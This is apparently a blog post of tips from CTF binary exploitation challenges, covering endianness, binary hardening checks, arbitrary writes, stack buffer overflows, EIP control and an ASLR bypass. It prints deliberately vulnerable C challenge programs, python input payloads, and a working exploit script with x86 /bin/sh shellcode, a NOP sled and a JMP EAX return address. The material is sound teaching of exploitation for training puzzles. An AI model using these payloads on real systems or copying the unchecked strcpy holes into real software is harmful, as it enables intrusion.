---
layout: post
title: "Learning from CTF: Binary Exploitation"
date: 2014-11-09 20:42:01 +0000
comments: true
categories: 
---
This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF's.
<!-- more -->

<ol>
<li>
Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address.
<br>
{% img left /images/big-endian.png 250 250 %}
{% img right /images/little-endian.png 250 250 %}
</li>
<br><br><br><br><br><br><br><br><br>
<li>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.
<ul>
<li>Executable binary is running on whether x86 or x86-64. (uname -a)</li>
<li>Whether the binary is compiled for 32 bit or 64 bit (file binary_file)</li>
<li>Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE) can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.</li>
<li>Whether the stack of binary is executable is not can be found by readelf tool. IF Program header GNU_STACK has RWE flag, if it has E flag, it's executable.</li>
</ul>
</li>

<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. run gdb <program>, p &<variablename>. For example, below you need the address of secret to write the new value 0x1337beef.
``` C
unsigned secret = 0xdeadbeef;

int main(int argc, char **argv){
    unsigned *ptr;
    unsigned value;
    char key[33];
    FILE *f;
    printf("Welcome! I will grant you one arbitrary write!\n");
    printf("Where do you want to write to? ");
    scanf("%p", &ptr);
    printf("Okay! What do you want to write there? ");
    scanf("%p", (void **)&value);
    printf("Writing %p to %p...\n", (void *)value, (void *)ptr);
    *ptr = value;
    printf("Value written!\n");
    if (secret == 0x1337beef){
        printf("Woah! You changed my secret!\n");
        printf("I guess this means you get a flag now...\n");

        f = fopen("flag.txt", "r");
        fgets(key, 32, f);
        fclose(f);
        puts(key);
        exit(0);
    }
    printf("My secret is still safe! Sorry.\n");
}
```</li>

<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can't be printed as ASCII characters, you can use python to pass the input.
```
python -c ' print "A" * 16 + "\xc0\xde\xfa\xce"' or python -c ' print "A" * 16 + "\xce\xfa\xde\xc0"' based on the endianess of the system.
```
``` C
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    int secret = 0;
    strcpy(buf, input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```</li>

<li>Controlling the EIP:
In the below challenge, an attacker can use a buffer overflow to take control of the program's execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
<ul>
<li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
<li>then you feed this as your input to the vulnerable program and it wil crash. so get the value of EIP at that point.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
</ul>
``` C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```</li>

<li> Execute Me:
If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
<ul>
<li>We should first check that executable binary is running on whether x86 or x86-64. (uname - a)</li>
<li>Then, we should check whether the binary is compiled for 32 bit or 64 bit (file <binary file>)</li>
<li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
</ul>

``` C
#include <stdio.h>
#include <stdlib.h>

int token = 0;

typedef void (*function_ptr)();

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    char buf[128];

    be_nice_to_people();

    read(0, buf, 128);

    ((function_ptr)buf)();
}
```</li>


<li> ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?

<ul>
<li>
From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call.  run the program within gdb and see what the state of the registers and the stack are at the time of the crash.
</li>
<li>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</li>
<li>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:
</li>
<li>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode by kernelpanic.</li>
<li> As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</li>
<li>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</li>
``` Python
import struct


code = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

jmpeax = struct.pack("<I",0x080483e7)

print "\x90"*51 + code + jmpeax

```
</ul>
``` C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

void vuln(char *name){
    char buf[64];
    strcpy(buf, name);
}

int main(int argc, char **argv){
    be_nice_to_people();
    if(argc > 1)
        vuln(argv[1]);
    return 0;
}
```</li>
</ol>
